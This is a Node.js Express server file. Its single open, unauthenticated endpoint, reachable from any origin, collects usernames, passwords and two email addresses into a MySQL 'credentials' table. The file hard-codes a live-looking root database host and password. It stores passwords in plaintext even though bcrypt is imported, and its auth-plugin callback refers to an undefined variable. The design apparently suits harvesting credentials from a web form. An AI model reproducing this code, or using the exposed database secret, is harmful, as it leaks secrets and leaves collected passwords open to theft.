const express = require("express");
const mysql = require("mysql2");
const bodyParser = require("body-parser");
const cors = require("cors");
const bcrypt = require("bcrypt");

const app = express();
const port = process.env.PORT ||  5000;

// Create a MySQL database connection
const connection = mysql.createConnection({
  host: "containers-us-west-34.railway.app",
  user: "root",
  password: "7dzQvxiM7Dsl9sdQzzXc",
  database: "railway",
  port: "8078",
  authPlugins: {
    mysql_clear_password: () => () => Buffer.from(password + "\0"),
  },
});

// Connect to the database
connection.connect((err) => {
  if (err) {
    console.error("Error connecting to the database:", err);
    return;
  }
  console.log("Connected to the database");
});

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());

// API endpoint to add credentials to the database
app.post("/add-credentials", (req, res) => {
  const { username, password, email, email2 } = req.body;

  // Insert the credentials into the "credentials" table
  const query =
    "INSERT INTO credentials (username, password, email, email2) VALUES (?, ?, ?, ?)";
  connection.query(query, [username, password, email, email2], (err, result) => {
    if (err) {
      console.error("Error inserting credentials:", err);
      res.status(500).send("An error occurred while inserting credentials.");
      return;
    }
    res.status(200).send("Credentials added successfully!");
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
